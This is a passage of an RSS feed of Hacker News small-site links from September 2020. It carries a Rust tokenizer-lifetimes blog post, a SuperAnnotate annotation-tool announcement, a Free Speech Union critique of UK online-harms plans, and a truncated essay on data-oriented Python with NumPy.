            <link>https://dacemirror.sci-hub.tw/journal-article/7fe084d6885f9339910bf080b718c012/rohrer2018.pdf?download=true</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506243</guid>
            <pubDate>Thu, 17 Sep 2020 15:58:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Favorite Rust Function Signature]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 115 (<a href="https://news.ycombinator.com/item?id=24505436">thread link</a>) | @brundolf
<br/>
September 17, 2020 | https://www.brandonsmith.ninja/blog/favorite-rust-function | <a href="https://web.archive.org/web/*/https://www.brandonsmith.ninja/blog/favorite-rust-function">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody">
      

      

      

      


      <p>I've gotten really into writing parsers lately, and Rust has turned out to be
        the perfect language for that. In the course of my adventures, I came up with
        the following:</p>
      <pre><code><span>fn</span> tokenize<span>&lt;</span><span>'a</span><span>&gt;</span><span>(</span>code<span>:</span> <span>&amp;</span><span>'a</span> str<span>)</span> <span>-&gt;</span> <span>impl</span> Iterator<span>&lt;</span>Item<span>=</span><span>&amp;</span><span>'a</span> str<span>&gt;</span> <span>{</span>
  <span>...</span>
<span>}</span>
</code></pre>
      <p>and it really deepened my appreciation for Rust.</p>
      <h2 id="what-does-this-function-do%3F">What does this function do? </h2>
      <p>For those not familiar with parsing, tokenization is the first step of the
        process. It takes a raw code string, like this:</p>
      <pre><code>let a = "foo";
</code></pre>
      <p>and turns it into a linear series of meaningful tokens, like so:</p>
      <pre><code>["let", "a", "=", "\"foo\"", ";"]
</code></pre>
      <p>This phase isn't terribly complicated, but it simplifies the mental model for
        the next pass: constructing an "abstract syntax tree". It removes whitespace
        from the equation, bundles up segments like strings and numbers, and just
        generally makes the code in the next pass cleaner.</p>
      <p>The downside is that, if you perform this as a separate pass, your parser now
        has to iterate over all of the source code <em>twice</em>. This may not be the end of
        the world: tokenizing isn't the most expensive operation. But it isn't ideal,
        so some parsers combine the two passes into a single one, saving cycles at the
        expense of readability.</p>
      <h2 id="what's-going-on-in-the-rust-version%3F">What's going on in the Rust version? </h2>
      <p>I'll copy the signature here again for reference:</p>
      <pre><code><span>fn</span> tokenize<span>&lt;</span><span>'a</span><span>&gt;</span><span>(</span>code<span>:</span> <span>&amp;</span><span>'a</span> str<span>)</span> <span>-&gt;</span> <span>impl</span> Iterator<span>&lt;</span>Item<span>=</span><span>&amp;</span><span>'a</span> str<span>&gt;</span> <span>{</span>
  <span>...</span>
<span>}</span>
</code></pre>
      <p>There are several things going on here.</p>
      <p><code>&amp;str</code>, in Rust, is a "string slice". It's effectively a character pointer and a
        length. The contents of the slice are guaranteed to be in valid, alive memory.
        <code>&amp;'a str</code> is a string slice <em>with a lifetime</em>. The lifetime <code>'a</code>, to be
        exact. This lifetime describes a limited span of time in which the
        reference (and the full contents of the slice) are guaranteed to be in valid,
        alive memory. More on this later.</p>
      <p><code>Iterator&lt;Item=&amp;'a str&gt;</code> is an iterator over elements of type <code>&amp;'a str</code>. This
        is a <em>trait</em>, though, not a concrete type. Rust needs a concrete type with a
        fixed size when you're defining something like a function, but luckily we can
        say <code>impl Iterator&lt;Item=&amp;'a str&gt;</code>, which tells Rust, "fill in some type that
        implements <code>Iterator&lt;Item=&amp;'a str&gt;</code>, to be inferred at compile-time". This is
        very helpful because in Rust there are lots and lots of different concrete types
        for <code>Iterator</code>; applying something like a <code>map()</code> or a <code>filter()</code> returns a whole
        new concrete type. So this way, we don't have to worry about keeping the
        function signature up to date as we work on the logic.</p>
      <h2 id="so-what's-so-great-about-all-this%3F">So what's so great about all this? </h2>
      <p>Okay, so we have a function that takes a reference to a string slice and returns
        an iterator over string slices. Why's that special? There are two reasons.</p>
      <h3 id="iterators-let-you-treat-one-pass-like-it's-two">Iterators let you treat one pass like it's two </h3>
      <p>Remember how I said you traditionally have to pick between doing a separate
        tokenization pass, and doing a single pass with all the logic interleaved? With
        an iterator, you can have the best of both worlds.</p>
      <p>When this function completes, it hasn't yet iterated over the string. It hasn't
        allocated any kind of collection in memory. It returns a structure that's
        <em>prepared</em> to iterate over the input string slice and produce a sequence of new
        slices. When this value later gets <code>map()</code>ed into something else, or
        <code>filter()</code>ed, or any other <code>Iterator</code> transformations get applied, the stages
        of the process get interleaved, and the "loops" effectively get folded into a
        single one. By doing this, we're able to get the clean abstraction of a
        tokenizing "pass" without the runtime overhead of a second loop!</p>
      <p>But other languages have iterators. Rust's may be extra powerful and ergonomic,
        but they aren't a totally unique feature. The next part is very much unique to
        Rust.</p>
      
      <p>The <code>tokenize()</code> function doesn't allocate any new memory for a collection of
        tokens. That's great. But what may be less obvious is that it <em>also</em> doesn't
        allocate any memory for the tokens themselves! Each string slice representing a
        token is a <em>direct pointer to part of the original string</em>.</p>
      <p>You can do this in C/C++, of course, but there's a danger: if those tokens are
        ever accessed after the original code string has been freed, you'll have a
        memory error.</p>
      <p>For example: let's say you open a file and load the source code from it, and
        store the result in a local variable. Then you <code>tokenize()</code> it and send the
        tokens on to somewhere else outside of the function where the original string
        lived. Voilà, you've got a <a href="https://en.wikipedia.org/wiki/Dangling_pointer">use-after-free error</a>.</p>
      <p>One way to guard against this is by copying each string segment into a <em>new</em>
        string, allocated on the heap, which allows you to safely pass it on after the
        original string is gone. But this comes with a cost: creating, copying, and
        eventually disposing of each of those new strings takes time (and memory). Code
        down the line also has to be aware that it's responsible for de-allocating those
        strings, otherwise they'll leak.</p>
      <p>This is where the magic of lifetimes comes into play.</p>
      <p>Rust prevents the above situation entirely. Normally, though, to accomplish this
        a <code>&amp;str</code> coming into a function from elsewhere must be assumed to be <em>static</em>,
        or to be alive for the entire duration of the program's execution. This is the
        status assigned to, for example, a string literal that you've manually entered
        into your Rust code. Rust doesn't know, in the context of the function, how
        long that reference will be valid, so it must be pessimistic.</p>
      <p><strong>But.</strong> That little <code>'a</code> says: "these things all live for the same span of time". We
        can <em>assert</em> that the original source code string lives at least as long as the
        <em>tokens</em> that reference it. By doing so, Rust can reason about whether or not
        those resulting token references are valid at a given point, and therefore
        doesn't have to assume them to be static! We can do <em>whatever we want</em> with
        those tokens and the compiler will guarantee that they always point to something
        valid, even if the source code is loaded in dynamically at runtime (from a file
        or otherwise). If we find out later via a compiler error that they really do
        need to outlive the source string, then we can copy them ("take ownership") at
        that point. If the compiler doesn't force us to do so, we know we're safe,
        and we know we can continue using the most efficient possible approach,
        <em>fearlessly</em>.</p>
      <p>What we've effectively done is written the most optimistic possible function
        (in terms of memory safety), with no downsides, because the Rust compiler will
        tell us if we're misusing it and force us to then "step down" to whatever level
        of extra accommodation is needed.</p>
      <h2 id="conclusion">Conclusion </h2>
      <p>I've been using (and loving) Rust for about a year and a half now. And there are
        many things to love, but when I got this function working I immediately saw it
        as a microcosm of what really sets the language apart. This is something that
        you <strong>cannot do</strong> both a) this safely and b) this efficiently <strong>in any other
language</strong>. This is the power of Rust.</p>


    </article></div>]]>
            </description>
            <link>https://www.brandonsmith.ninja/blog/favorite-rust-function</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505436</guid>
            <pubDate>Thu, 17 Sep 2020 15:00:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shutting Down NavHere]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 32 (<a href="https://news.ycombinator.com/item?id=24505232">thread link</a>) | @jermaustin1
<br/>
September 17, 2020 | https://jeremyaboyd.com/post/shutting-down-navhere | <a href="https://web.archive.org/web/*/https://jeremyaboyd.com/post/shutting-down-navhere">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://jeremyaboyd.com/post/shutting-down-navhere</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505232</guid>
            <pubDate>Thu, 17 Sep 2020 14:45:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SuperAnnotate Desktop: A better alternative to free annotation tools]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24505211">thread link</a>) | @tigranhakobian
<br/>
September 17, 2020 | https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools | <a href="https://web.archive.org/web/*/https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">
<p><img src="https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=1200&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png" alt="SuperAnnotate OpenCV partnership-1" width="1200" srcset="https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=600&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 600w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=1200&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 1200w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=1800&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 1800w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=2400&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 2400w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=3000&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 3000w, https://blog.superannotate.com/hs-fs/hubfs/SuperAnnotate%20OpenCV%20partnership-1.png?width=3600&amp;name=SuperAnnotate%20OpenCV%20partnership-1.png 3600w" sizes="(max-width: 1200px) 100vw, 1200px"></p>

<h3><strong>As part of our partnership with OpenCV, we are launching the best free annotation tool for the computer vision community.</strong></h3>

<p><em>In this post, I will be introducing SuperAnnotate’s new free-to-use desktop app, discuss some of the reasons why we built it, and share more about many of the features which we feel will dramatically increase the speed, accuracy, and efficiency of annotation projects. There is a massive functionality gap between free and commercial image annotation tools. SuperAnnotate Desktop is closing this gap by providing the fastest all-inclusive software tool for computer vision engineers to complete their annotation tasks.&nbsp;</em></p>
<!--more-->
<h3><strong><span>Outline</span></strong></h3>
<ul>
<li>The world of free image annotation tools</li>
<li>Introducing SuperAnnotate Desktop </li>
<li>Eight reasons why you should use SuperAnnotate Desktop </li>
<li>Importing annotations from other platforms</li>
<li>The future of SuperAnnotate Desktop</li>
</ul>
<h2><strong>1. The World of Free Image Annotation Tools</strong></h2>
<p>Instead of writing a rather long introduction on the universe of free image annotation tools, I will quickly summarize many of the well-written articles, blogs, and websites covering the topic. Probably the most informative website discussing free tools is <a href="https://awesomeopensource.com/"><span>https://awesomeopensource.com/</span></a>, which ranks open source tools based on the number of&nbsp; GitHub stars each tool has received. The list for image annotation tools can be found<a href="https://awesomeopensource.com/projects/annotation-tool"> <span>here</span></a>. According to the list, it becomes apparent that CVAT (managed by Intel) and VOTT (managed by Microsoft) are among the most popular free tools for image annotation. There are several other interesting articles that include CVAT and VOTT among the best annotation tools available for free. Here are a few examples:<a href="https://bohemian.ai/blog/image-annotation-tools-which-one-pick-2020/"> <span>Bohemian.ai</span></a>,<a href="https://www.sicara.ai/blog/2019-09-01-top-five-open-source-annotation-tools-computer-vision"> <span>Sicara.ai</span></a>,<a href="https://en.wikipedia.org/wiki/List_of_manual_image_annotation_tools"> <span>Wikipedia</span></a>.</p>
<p>These articles are wonderful resources, and I strongly recommend reading them to learn about the different tools available and even try some of them if you have the time. However, what you soon start to realize is that free tools are lacking in many areas resulting in slow speeds, disjointed project management, and an overall non-intuitive user experience - especially when you consider what we’ve come to expect from software today.&nbsp;</p>

<h2><strong>2. </strong><strong>Introducing SuperAnnotate Desktop </strong><strong> </strong></h2>
<p>The founding team of SuperAnnotate (my brother and I) were PhD students in biomedical imaging and computer vision, respectively. During the course of our PhDs, we spent a considerable amount of time working with images, particularly with annotations. In 2018, free annotation tools were as incredibly inconvenient as they are today, and it was quite painful using them. They were not only extremely slow and clunky, but also lacked many key annotation functionalities. These pains led us to launch SuperAnnotate.&nbsp;</p>
<p>Since founding SuperAnntotate, we have always been focused on releasing software that is lightning-fast, easy to use, and extremely functional for all types of computer vision tasks. Over the last two years, we’ve worked hard to build what we think is the fastest and most efficient annotation platform for computer vision pipelines. And, as we came from academia, we also wanted to make a version of our platform easily installable and free for anyone, to help eliminate many of the pains my brother and I faced as PhD students.&nbsp;</p>
<p>Back in June we announced our partnership with OpenCV to bring a free annotation tool to the broader computer vision community that is a significant upgrade over the current free tools available.</p>
<p>A few days ago we released software for <strong>Mac</strong>, <strong>Windows</strong> and <strong>Linux</strong> users. Despite being the initial release, the software already provides multiple advanced features that will accelerate your labeling process by 3–5x.</p>
<p><!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-d65647e7-d436-4d5f-831c-82dae9c73cef"><span id="hs-cta-d65647e7-d436-4d5f-831c-82dae9c73cef"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/7839526/d65647e7-d436-4d5f-831c-82dae9c73cef"><img id="hs-cta-img-d65647e7-d436-4d5f-831c-82dae9c73cef" src="https://no-cache.hubspot.com/cta/default/7839526/d65647e7-d436-4d5f-831c-82dae9c73cef.png" alt="Download SuperAnnotate Desktop"></a></span></span><!-- end HubSpot Call-to-Action Code --></p>
<p>We will keep updating our desktop app on a monthly basis and would love to get the community’s feedback on features you all like, as well as the ones that are missing. We’re excited to be a bigger part of the OpenCV community, and to help provide the best computer vision tools to its members.</p>

<p><img src="https://lh3.googleusercontent.com/yWBnNCxg3fqyUsM_kxoSPxZ2ELSDlAGx2q4y_xKmqHYZBBc2IceePuyJbsjzCXyYCDtVm8-66hTbIXoqCS01eJC8RiINmUJqolVcOyu2IBLmFCFPM6t2dG6WgtIzwt397BGsNv9i" width="624" height="391" alt="SuperAnnotate Desktop free annotation tool"></p>

<h2><strong>3. Eight reasons why you should use SuperAnnotate Desktop&nbsp;</strong></h2>
<p>In this section, I will do a deeper dive into some of the features that make our app unique compared to some of the most popular alternatives. As I mentioned above, the paid version of our platform is focused on delivering lightning-fast speed, robust workflows, and a delightful user experience. We tried to bring that focus (and a few of the features) into our desktop app. Here we go:&nbsp;</p>
<p><em>Note: I strongly recommend watching the video below which summarizes all these components.</em></p>

<div data-service="youtube" data-responsive="true"><div><p data-mce-style="position: relative; overflow: hidden; max-width: 100%; padding-bottom: 56.25%; margin: 0px;"><iframe width="480" height="270" src="https://www.youtube.com/embed/_wFYtQY3v14?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" xml="lang" data-mce-src="https://www.youtube.com/embed/_wFYtQY3v14?feature=oembed" data-mce-style="position: absolute; top: 0px; left: 0px; width: 100%; height: 100%; border: none;"></iframe></p></div></div>

<p><strong>3.1 Born out of SuperAnnotate’s Core Platform</strong>&nbsp;—  We’ve spent the last two years and we have invested hundreds of thousands of engineering hours and millions of dollars on the core web version of SuperAnnotate, building what we feel is the fastest and most efficient annotation platform for computer vision. It incorporates feedback from annotators working hundreds of thousands of hours in the web version of our platform as well. This has allowed us to deliver our desktop editor with some of the designs, features, and refinements from our core product offering. We hope the result is a 100% free product that is delightful, feature-rich, and professional grade.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
<p><strong>3.2 Advanced polygon tool </strong>— Polygon annotation is often the most time-consuming annotation task. Anyone who has tried free annotation tooling knows how poor the experience can be. We made several additions to traditional polygon tools in order to make manual polygon creation and editing much faster. Some of these features include:</p>
<ul>
<li><em>Pen-polygon tool  </em>— use the polygon as a pen making curved annotations much faster</li>
<li><em>Point addition/removal </em>—<em> Add</em> <em>and remove</em> polygon points with just a couple of clicks<strong>&nbsp;</strong></li>
<li><em>Edit polygon</em> —  Substantially increase the speed of editing polygons with our pen polygon tool&nbsp;</li>
<li><em>Share polygon boundaries</em> — draw polygons with shared boundaries 2x faster than traditional tools</li>
<li><em>Polygon move</em><span>/group/delete — select, drag, drop, or delete individual or groups of polygons wherever you want</span></li>
</ul>
These are just some of the features that allow us to reduce polygon annotation times by 20-60% while making polygon annotations significantly more accurate.&nbsp;
<p><strong>3.3 Filtering </strong> —  Most annotation tools lack the ability to filter images. Yet we have found that class filtering has a dramatic impact on speeding up the annotation review process. Through SuperAnnotate’s filtering menu, users can display only images with certain classes they are interested in reviewing, avoiding the need to comb through all of the images and saving tremendous amounts of time.&nbsp;</p>
<p><strong>3.4 Tracking multiple objects between frames</strong> —  Tracking multiple objects between consecutive frames can dramatically improve the annotation experience while also making annotating much faster. Our desktop app allows users to select multiple objects and perform operations such as move, delete, group, copy, paste, and duplicate. Users can copy and duplicate annotations in successive frames while keeping the same attribute ID so that a particular attribute can be tracked through multiple frames easily.&nbsp;</p>
<p><strong>3.5 Huge list of shortcuts</strong> — Gamers and power users of tools like excel and photoshop know how a robust list of shortcuts can both improve the user experience and add considerable speed. That was why we made a huge list of shortcuts for actions like tool selection, on-screen navigation, copy/paste/group/ungroup objects, switching between frames, and others. All shortcuts take place on the left side of the keyboard (similar to gaming), so your right hand can stay focused on the mouse, and your left hand does not have to move while finding the right shortcut.&nbsp;</p>
<p><strong>3.6 Labeling Flexibility</strong>  — Current platforms (both free and paid) limit you to one labeling workflow: you set the attributes and then draw the shapes. Oftentimes, it can be significantly more efficient to have different workflows such as drawing shapes first, or copying classes between instances. With SuperAnnotate, we allow for a wide range of labeling workflows, giving users the flexibility they need to be most efficient.</p>
<p><strong>3.7 Classes/attributes/point labels  </strong>— Creating, adding, or deleting classes and attributes is made very simple in the SuperAnnotate desktop app. Users can easily import classes from previous projects saving the time needed to define projects. In addition, we allow users to annotate individual points with free text. This can have multiple uses such as, describing the object by a sentence, giving a tag to the object, or describing the specific point in the polygon (e.g. rear-right wheel).</p>
<p><strong>3.8 Leveling up your annotations</strong> — As your annotation needs increase, you will likely find yourself looking for things like increased automations, ML features, more robust project management, detailed quality assurance, team collaboration, and user roles. You might also find yourself needing outsourced annotation teams. At SuperAnnotate, we can satisfy all of these needs and much more via our core platform. <span>Our core platform leverages ML and workflow-based features to help computer vision teams increase annotation speed by up to 10x, while dramatically improving the quality of training data and increasing the efficiency of managing annotation projects. We also have integrated services on the platform, giving customers the ability to access thousands of professionally managed outsourced annotators armed with our lightning-fast tooling. If you are interested in learning more about our core platform and services, please fill out </span><a href="https://www.superannotate.com/contacts?utm_source=blog&amp;utm_medium=article&amp;utm_campaign=SuperAnnotate_Desktop_Launch" rel="noopener"><span>this form</span></a><span>.&nbsp;</span></p>

<h2><strong>4. Importing annotations from other platforms or open-source tools</strong></h2>
<p>Migrating to SuperAnnotate from other software is something important to our customers. This was a common request from our users as many of them wanted to use our platform to quality check their previous work and transition over from other tools. We’ve made it super easy to import annotated data from other annotation tools using only a few lines of code, which I’ve described below. Then, once in our platform, users can leverage features described above like filtering and advanced …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools">https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools</a></em></p>]]>
            </description>
            <link>https://blog.superannotate.com/superannotate-desktop-a-better-alternative-to-free-annotation-tools</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505211</guid>
            <pubDate>Thu, 17 Sep 2020 14:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UK government’s plans to regulate the internet are a threat to free speech]]>
            </title>
            <description>
<![CDATA[
Score 231 | Comments 185 (<a href="https://news.ycombinator.com/item?id=24505074">thread link</a>) | @timthorn
<br/>
September 17, 2020 | https://freespeechunion.org/why-the-governments-plans-to-regulate-the-internet-are-a-threat-to-free-speech/ | <a href="https://web.archive.org/web/*/https://freespeechunion.org/why-the-governments-plans-to-regulate-the-internet-are-a-threat-to-free-speech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-17831" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
	
<div>

	
	<!-- .entry-header -->

	
	<div itemprop="text">

		
		
<p>Dr Radomir Tylecote</p>



<p>September 2020</p>



<p><a href="https://freespeechunion.org/fsu-briefing-online-harms/">Full Report</a><br><a href="https://www.gofundme.com/f/the-free-speech-union-fighting-fund">GoFundMe appeal</a></p>



<figure><div>
<p><iframe title="How the Government’s plans to regulate the internet are a threat to free speech" width="1200" height="675" src="https://www.youtube.com/embed/CQac6mzC444?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
</div></figure>







<h3>The Government’s proposed new internet regulator will infringe free speech</h3>



<p>The Government published the Online Harms White Paper in April 2019 and intends to put a Bill before Parliament next year. The proposals aim to make the UK “the safest place in the world to go online”, but they will seriously infringe free speech.</p>



<p>Some of the harms the White Paper identifies are real, including distributing images of child abuse and online activities by terrorists. But these would be better dealt with by simpler legislation and more resources for law enforcement.</p>



<p>However, some of the harms the White Paper describes are vague, such as “unacceptable content” and “disinformation”. These are not fixed but would be determined by a future regulator. This will lead to sweeping censorship. Online Harms does not even properly define “harm”, so the definition risks being outsourced to activists and lobby groups.</p>



<p>A proposed new regulator will even have the power to censor lawful content: the government says new regulation should prohibit material “that may directly or indirectly cause harm” even if “not necessarily illegal”. The Government also singled out “offensive material”, as if giving offence is a harm the public should be protected from by the state.</p>



<h3>The proposals move the UK towards the internet laws of China, Russia and Belarus</h3>



<p>The Government’s proposals are partly inspired by Germany’s 2017 “NetzDG” internet law, but Human Rights Watch has called for Germany to scrap the law, saying it “turns internet companies into censors”. President Lukashenko of Belarus, Vladimir Putin’s United Russia Party and the Venezuelan government have cited NetzDG as the model for their online laws.</p>



<p>Our government’s plans also bear a worrying similarity to Beijing’s internet censorship policies. Beijing censors “rumours” because they cause “social harms”. Our government’s proposals describe “disinformation” as “harmful”, and will make “content which has been disputed by reputable fact-checking services less visible to users”, forcing companies to promote “authoritative news sources”. This contradicts our government’s claim that “the regulator will not be responsible for policing truth and accuracy online”.</p>



<p>While the authors of the White Paper believe their proposals will mean more “tolerance” and less “hate”, they will likely have the opposite effect, as people respond angrily to censorship and conspiracy theorists enjoy the cachet of being banned by the state.</p>



<p>In this briefing we outline the Government’s Online Harms plans and explain why they are a danger to freedom of speech. Later this year, the Free Speech Union will propose alternative regulation to protect the vulnerable without jeopardising free speech.</p>



<p><a href="https://freespeechunion.org/fsu-briefing-online-harms/">Full Report</a><br><a href="https://www.gofundme.com/f/the-free-speech-union-fighting-fund">GoFundMe appeal</a></p>



<p><em>FSU research papers are designed to promote discussion of free speech issues. As with all FSU publications, the views expressed are those of the author(s) and not those of the FSU, its directors, Advisory Councils or other senior staff.</em></p>

		
		
			</div><!-- .entry-content .clear -->
</div>

	
</article></div>]]>
            </description>
            <link>https://freespeechunion.org/why-the-governments-plans-to-regulate-the-internet-are-a-threat-to-free-speech/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24505074</guid>
            <pubDate>Thu, 17 Sep 2020 14:31:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data-Oriented Programming in Python]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 30 (<a href="https://news.ycombinator.com/item?id=24504947">thread link</a>) | @jbredeche
<br/>
September 17, 2020 | https://www.moderndescartes.com/essays/data_oriented_python/ | <a href="https://web.archive.org/web/*/https://www.moderndescartes.com/essays/data_oriented_python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
	

<p> Originally posted 2020-09-13</p>
<p> Tagged: <a href="https://www.moderndescartes.com/essays/tags/optimization">optimization</a>, <a href="https://www.moderndescartes.com/essays/tags/computer_science">computer_science</a>, <a href="https://www.moderndescartes.com/essays/tags/python">python</a></p>
<p> <em>Obligatory disclaimer: all opinions are mine and not of my employer </em></p>
<hr>

<p>Many users of Python deprioritize performance in favor of soft benefits like ergonomics, business value, and simplicity. Users who prioritize performance typically end up on faster compiled languages like C++ or Java.</p>
<p>One group of users is left behind, though. The scientific computing community has lots of raw data they need to process, and would very much like performance. Yet, they struggle to move away from Python, because of network effects, and because Python’s beginner-friendliness is appealing to scientists for whom programming is not a first language. So, how can Python users achieve some fraction of the performance that their C++ and Java friends enjoy?</p>
<p>In practice, scientific computing users rely on the NumPy family of libraries e.g.&nbsp;NumPy, SciPy, TensorFlow, PyTorch, CuPy, JAX, etc.. The sheer proliferation of these libraries suggests that the NumPy model is getting something right. In this essay, I’ll talk about what makes NumPy so effective, and where the next generation of Python numerical computing libraries (e.g.&nbsp;TensorFlow, PyTorch, JAX) seems to be headed.</p>
<h2 id="data-good-pointers-bad">Data good, pointers bad</h2>
<p>A pesky fact of computing is that computers can compute far faster than we can deliver data to compute on. In particular, data transfer <em>latency</em> is the Achille’s heel of data devices (both RAM and storage). Manufacturers disguise this weakness by emphasizing improvements in data transfer <em>throughput</em>, but latency continues to stagnate. Ultimately, this means that any chained data access patterns, where one data retrieval must be completed before the next may proceed, are the worst case for computers.</p>
<p>These worst-case chained data access patterns are unfortunately quite common – so common that they have a name you may be familiar with: a pointer.</p>
<p>Pointers have always been slow. In the ’80s and ’90s, our hard drives were essentially optimized record players, with a read head riding on top of a spinning platter. These hard drives had physical limitations: The disk could only spin so fast without shattering, and the read head was also mechanical, limiting its movement speed. Disk seeks were slow, and the programs that were most severely affected were databases. Some ways that databases dealt with these physical limitations are:</p>
<ul>
<li>Instead of using binary trees (requiring <span>\(\log_2 N\)</span> disk seeks), B-trees with a much higher branching factor <span>\(k\)</span> were used, only requiring <span>\(\log_k N\)</span> disk seeks.</li>
<li>Indices were used to query data without having to read the full contents of each row.</li>
<li>Vertically-oriented databases optimized for read-heavy workloads (e.g.&nbsp;summary statistics over one field, across entire datasets), by reorganizing from <a href="https://en.wikipedia.org/wiki/AoS_and_SoA">arrays of structs to structs of arrays</a>. This maximized effective disk throughput, since no extraneous data was loaded.</li>
</ul>
<p>Today, compute speed is roughly <span>\(10^5 - 10^6\)</span> times faster than in 1990. Today, RAM is roughly <span>\(10^5\)</span> times faster than HDDs from 1990. I was amused and unsurprised to find that Raymond Hettinger’s <a href="https://www.youtube.com/watch?v=npw4s1QTmPg">excellent talk on the evolution of Python’s in-memory <code>dict</code> implementation</a> plays out like a brief history of early database design. Time, rather than healing things, has only worsened the compute-memory imbalance.</p>
<h2 id="numpys-optimizations">NumPy’s optimizations</h2>
<h3 id="boxing-costs">Boxing costs</h3>
<p>In many higher-level languages, raw data comes in boxes containing metadata and a pointer to the actual data. In Python, the PyObject box holds reference counts, so that the garbage collector can operate generically on all Python entities.</p>
<p>Boxing creates two sources of inefficiency:</p>
<ul>
<li>The metadata bloats the data, reducing the data density of our expensive memory.</li>
<li>The pointer indirection creates another round trip of memory retrieval latency.</li>
</ul>
<p>A NumPy array can hold many raw data within a single PyObject box, <em>provided that all of those data are of the same type</em> (int32, float32, etc.). By doing this, NumPy amortizes the cost of boxing over multiple data.</p>
<p>In <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">my previous investigations into Monte Carlo tree search</a>, a naive UCT implementation performed poorly because it instantiated millions of UCTNode objects whose sole purpose was to hold a handful of float32 values. In the optimized UCT implementation, these nodes were replaced with NumPy arrays, reducing memory usage by a factor of 30.</p>
<h3 id="attribute-lookup-function-dispatch-costs">Attribute lookup / function dispatch costs</h3>
<p>Python’s language design forces an unusually large amount of pointer chasing. I mentioned boxing as one layer of pointer indirection, but really it’s just the tip of the iceberg.</p>
<p>Python has no problem handling the following code, even though each of these multiplications invokes a completely different implementation.</p>
<pre><code>&gt;&gt;&gt; mixed_list = [1, 1.0, 'foo', ('bar',)]
&gt;&gt;&gt; for obj in mixed_list:
...     print(obj * 2)

2
2.0
'foofoo'
('bar', 'bar')</code></pre>
<p>Python accomplishes this with a minimum of two layers of pointer indirection:</p>
<ol type="1">
<li>Look up the type of the object.</li>
<li>Look up and execute the <code>__mul__</code> function from that type’s operation registry.</li>
</ol>
<p>Additional layers of pointer indirection may be required if the <code>__mul__</code> method is defined on a superclass: the chain of superclasses must be traversed, one pointer at a time, until an implementation is found.</p>
<p>Attribute lookup is similarly fraught; <code>@property</code>, <code>__getattr__</code>, and <code>__getattribute__</code> provide users with flexibility that incurs pointer chasing overhead with something as simple as executing <code>a.b</code>. Access patterns like <code>a.b.c.d</code> create exactly the chained data access patterns that are a worst-case for data retrieval latency.</p>
<p>To top it all off, merely <em>resolving</em> the object is expensive: there’s a stack of lexical scopes (local, nonlocal, then global) that are checked in order to find the variable name. Each check requires a dictionary lookup, another source of pointer indirection.</p>
<p>As the saying goes: “We can solve any problem by introducing an extra level of indirection… except for the problem of too many levels of indirection”. The NumPy family of libraries deals with this indirection, not by removing it, but again by sharing its cost over multiple data.</p>
<pre><code>&gt;&gt;&gt; homogenous_array = np.arange(5, dtype=np.float32)
&gt;&gt;&gt; multiply_by_two = homogenous_array * 2
&gt;&gt;&gt; print(multiply_by_two)
array([ 0.,  2.,  4.,  6.,  8.], dtype=float32)</code></pre>
<p>Sharing a single box for multiple data allows NumPy to retain the expressiveness of Python while minimizing the cost of the dynamism. As before, this works because of the additional constraint that all data in a NumPy array must have identical type.</p>
<h2 id="the-frontier-jit">The Frontier: JIT</h2>
